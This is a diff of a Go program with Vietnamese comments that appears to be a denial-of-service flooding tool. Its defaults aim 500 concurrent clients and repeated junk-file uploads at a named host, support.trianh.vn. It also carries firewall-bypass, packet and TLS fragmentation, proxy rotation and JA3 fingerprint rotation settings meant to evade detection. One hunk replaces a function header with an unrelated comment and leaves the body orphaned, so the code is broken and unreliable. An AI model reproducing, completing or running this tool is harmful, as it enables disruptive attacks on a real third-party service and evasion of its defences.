@@ -62,33 +62,31 @@ type Proxy struct {
 
 // Cấu trúc để lưu cấu hình
 type Config struct {
-	TargetServer                string
-	TargetPort                  string
-	Protocol                    string
-	Endpoints                   []string
-	MaxConcurrent               int
-	DelayMs                     int
-	TimeoutMs                   int // Thời gian timeout request
-	MaxRetries                  int // Số lần retry tối đa
-	ConnectionIdleMs            int // Thời gian idle connection
-	PreferredCountries          []string
-	PfSenseBypass               bool
-	FragmentPackets             bool
-	TTLBypass                   int
-	TcpWindowSize               int     // Kích thước cửa sổ TCP
-	MssClamp                    int     // Giá trị MSS clamp
-	UseTlsFragmentation         bool    // Sử dụng TLS fragmentation
-	RotateJA3Fingerprint        bool    // Xoay vòng JA3 fingerprint
-	UseDirectRatio              float64 // Tỷ lệ sử dụng kết nối trực tiếp
-	ProxyRotateIntervalSec      int     // Thời gian xoay vòng proxy
-	ProxyBlacklistTimeMin       int     // Thời gian trong blacklist
-	RandomTiming                bool    // Sử dụng thời gian ngẫu nhiên
-	TimingJitterMs              int     // Độ lệch thời gian
-	EnableFileUpload            bool    // Kích hoạt tính năng upload file
-	FileUploadSizeMB            int     // Kích thước file upload (MB)
-	FileUploadRatio             float64 // Tỷ lệ request sử dụng upload
-	FileUploadChunkSize         int     // Kích thước chunk khi upload file
-	FileUploadTimeoutMultiplier int     // Hệ số nhân timeout cho file upload
+	TargetServer           string
+	TargetPort             string
+	Protocol               string
+	Endpoints              []string
+	MaxConcurrent          int
+	DelayMs                int
+	TimeoutMs              int // Thời gian timeout request
+	MaxRetries             int // Số lần retry tối đa
+	ConnectionIdleMs       int // Thời gian idle connection
+	PreferredCountries     []string
+	PfSenseBypass          bool
+	FragmentPackets        bool
+	TTLBypass              int
+	TcpWindowSize          int     // Kích thước cửa sổ TCP
+	MssClamp               int     // Giá trị MSS clamp
+	UseTlsFragmentation    bool    // Sử dụng TLS fragmentation
+	RotateJA3Fingerprint   bool    // Xoay vòng JA3 fingerprint
+	UseDirectRatio         float64 // Tỷ lệ sử dụng kết nối trực tiếp
+	ProxyRotateIntervalSec int     // Thời gian xoay vòng proxy
+	ProxyBlacklistTimeMin  int     // Thời gian trong blacklist
+	RandomTiming           bool    // Sử dụng thời gian ngẫu nhiên
+	TimingJitterMs         int     // Độ lệch thời gian
+	EnableFileUpload       bool    // Kích hoạt tính năng upload file
+	FileUploadSizeMB       int     // Kích thước file upload (MB)
+	FileUploadRatio        float64 // Tỷ lệ request sử dụng upload
 }
 
 // Đánh dấu proxy thất bại
@@ -281,33 +279,31 @@ func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
 // Đọc cấu hình từ file config.txt
 func loadConfig(filename string) (*Config, error) {
 	config := &Config{
-		TargetServer:                "support.trianh.vn", // Mặc định
-		TargetPort:                  "443",
-		Protocol:                    "https",
-		Endpoints:                   []string{"/feedback/index", "/task/index", "/api/status", "/health", "/internal-chat/send-file"},
-		MaxConcurrent:               500,
-		DelayMs:                     5,
-		TimeoutMs:                   15000,
-		MaxRetries:                  5,
-		ConnectionIdleMs:            3000,
-		PreferredCountries:          []string{"VN", "SG", "JP"}, // Ưu tiên proxy Việt Nam, Singapore, Nhật
-		PfSenseBypass:               true,
-		FragmentPackets:             true,
-		TTLBypass:                   65,
-		TcpWindowSize:               65535,
-		MssClamp:                    1452,
-		UseTlsFragmentation:         true,
-		RotateJA3Fingerprint:        true,
-		UseDirectRatio:              0.3,
-		ProxyRotateIntervalSec:      30,
-		ProxyBlacklistTimeMin:       2,
-		RandomTiming:                true,
-		TimingJitterMs:              150,
-		EnableFileUpload:            true,
-		FileUploadSizeMB:            5,
-		FileUploadRatio:             0.2,
-		FileUploadChunkSize:         1024 * 1024, // Mặc định 1MB
-		FileUploadTimeoutMultiplier: 2,           // Mặc định nhân 2 lần timeout
+		TargetServer:           "support.trianh.vn", // Mặc định
+		TargetPort:             "443",
+		Protocol:               "https",
+		Endpoints:              []string{"/feedback/index", "/task/index", "/api/status", "/health", "/internal-chat/send-file"},
+		MaxConcurrent:          500,
+		DelayMs:                5,
+		TimeoutMs:              15000,
+		MaxRetries:             5,
+		ConnectionIdleMs:       3000,
+		PreferredCountries:     []string{"VN", "SG", "JP"}, // Ưu tiên proxy Việt Nam, Singapore, Nhật
+		PfSenseBypass:          true,
+		FragmentPackets:        true,
+		TTLBypass:              65,
+		TcpWindowSize:          65535,
+		MssClamp:               1452,
+		UseTlsFragmentation:    true,
+		RotateJA3Fingerprint:   true,
+		UseDirectRatio:         0.3,
+		ProxyRotateIntervalSec: 30,
+		ProxyBlacklistTimeMin:  2,
+		RandomTiming:           true,
+		TimingJitterMs:         150,
+		EnableFileUpload:       true,
+		FileUploadSizeMB:       5,
+		FileUploadRatio:        0.2,
 	}
 
 	// Đọc file cấu hình
@@ -431,14 +427,6 @@ func loadConfig(filename string) (*Config, error) {
 		case "FILE_UPLOAD_RATIO":
 			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
 				config.FileUploadRatio = f
-			}
-		case "FILE_UPLOAD_CHUNK_SIZE":
-			if i, err := strconv.Atoi(value); err == nil && i > 0 {
-				config.FileUploadChunkSize = i
-			}
-		case "FILE_UPLOAD_TIMEOUT_MULTIPLIER":
-			if i, err := strconv.Atoi(value); err == nil && i > 0 {
-				config.FileUploadTimeoutMultiplier = i
 			}
 		}
 	}
@@ -1099,8 +1087,7 @@ func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitG
 	}
 }
 
-// Cải thiện việc hiển thị thống kê
-func printStats(stats *Stats, startTime time.Time, proxyPool *ProxyPool, config *Config) {
+// Vô hiệu hóa proxy trong một khoảng thời gian
 	// Tính thời gian đã trôi qua
 	elapsed := time.Since(startTime)
 	elapsedSeconds := float64(elapsed) / float64(time.Second)
@@ -1162,6 +1149,7 @@ func printStats(stats *Stats, startTime time.Time, proxyPool *ProxyPool, config 
 
 // Hàm định dạng thời gian
 func formatDuration(d time.Duration) string {
+	d = d.Round(time.Second)
 	h := d / time.Hour
 	d -= h * time.Hour
 	m := d / time.Minute
@@ -1212,7 +1200,7 @@ func sendFileUploadRequest(endpoint string, clientID int, stats *Stats, wg *sync
 	}
 
 	// Tăng timeout cho client để xử lý file lớn
-	client.Timeout = time.Duration(config.TimeoutMs*config.FileUploadTimeoutMultiplier) * time.Millisecond
+	client.Timeout = time.Duration(config.TimeoutMs*2) * time.Millisecond
 
 	// Tạo URL dựa trên protocol
 	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)
@@ -1243,7 +1231,7 @@ func sendFileUploadRequest(endpoint string, clientID int, stats *Stats, wg *sync
 
 		// Tạo dữ liệu giả cho file - sử dụng cách tiết kiệm bộ nhớ
 		fileSize := config.FileUploadSizeMB * 1024 * 1024 // Convert MB to bytes
-		chunkSize := config.FileUploadChunkSize           // Sử dụng kích thước chunk từ cấu hình
+		chunkSize := 1024 * 1024                          // 1MB chunks
 
 		// Tạo file part
 		fw, err := w.CreateFormFile("file", fmt.Sprintf("test_file_%d.dat", clientID))
